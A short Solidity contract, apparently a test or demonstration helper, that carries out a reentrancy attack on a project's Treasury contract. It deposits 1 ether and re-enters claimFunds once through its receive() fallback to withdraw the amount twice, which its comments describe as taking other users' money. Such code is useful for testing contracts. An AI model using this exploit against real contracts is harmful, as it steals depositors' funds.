// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../Treasury.sol";

contract ReentrancyAttacker {
    Treasury public treasury;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    bool private reentered;

    constructor(address _treasuryAddress) {
        treasury = Treasury(_treasuryAddress);
    }

    // Fallback function to re-enter the claimFunds function
    receive() external payable {
        // Re-enter only once to steal funds without reverting the whole transaction
        if (!reentered) {
            reentered = true;
            // Withdraw the same amount again, which should be someone else's money
            treasury.claimFunds(ATTACK_AMOUNT);
        }
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT, "Must deposit exactly 1 ETH");
        // Deposit funds into the Treasury contract
        treasury.deposit{value: ATTACK_AMOUNT}();
        // Start the attack by claiming the deposited funds
        treasury.claimFunds(ATTACK_AMOUNT);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
